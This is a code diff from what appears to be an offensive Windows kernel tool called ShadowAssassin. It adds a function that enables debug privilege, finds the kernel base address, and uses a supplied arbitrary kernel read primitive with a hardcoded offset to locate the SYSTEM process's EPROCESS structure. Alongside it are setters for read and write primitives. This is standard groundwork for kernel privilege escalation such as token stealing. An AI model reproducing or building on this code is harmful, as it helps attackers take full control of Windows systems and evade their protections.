@@ -12,8 +12,44 @@ void ShadowAssassin::SetReadPrimitive(std::function<void(UINT64*, UINT64, UINT64
 void ShadowAssassin::SetWritePrimitive(std::function<void(UINT64, UINT64)> fn)          { writeFn = fn; }
 void ShadowAssassin::SetScratchAddress(UINT64 addr)     { scratchAddress  = addr;   }
 
+
+UINT64 ShadowAssassin::Get_System_EPROCESS() {
+    HANDLE hToken;
+    LUID luid;
+    TOKEN_PRIVILEGES tp;
+
+    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken);
+    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);
+
+    tp.PrivilegeCount = 1;
+    tp.Privileges[0].Luid = luid;
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
+    CloseHandle(hToken);
+
+    //getting ntobase
+    UINT64 ntobase = 0;
+    LPVOID drivers[1024];
+    DWORD filler;
+    if (EnumDeviceDrivers(drivers, sizeof(drivers), &filler)) {
+        ntobase = reinterpret_cast<uint64_t>(drivers[0]);
+    }
+    else {
+        DbgLog("need to run as admin.\n");
+    }
+
+    UINT64 ps_system_pointer = ntobase + OFF_PS_INITIAL_SYSTEM_PROCESS;
+    UINT64 result;
+
+    readFn(&result, ps_system_pointer, 0x8);
+    DbgLog("Found EPROCESS struct using sedbg at %llx\n\n", result);
+    return result;
+}
+
+
 void ShadowAssassin::SetEPROCESS(UINT64 ep) {
-	EPROCESS = ep;
+    EPROCESS = ep;
 }
 
 FrameManager& ShadowAssassin::GetFrameManager() { return frameManager; }
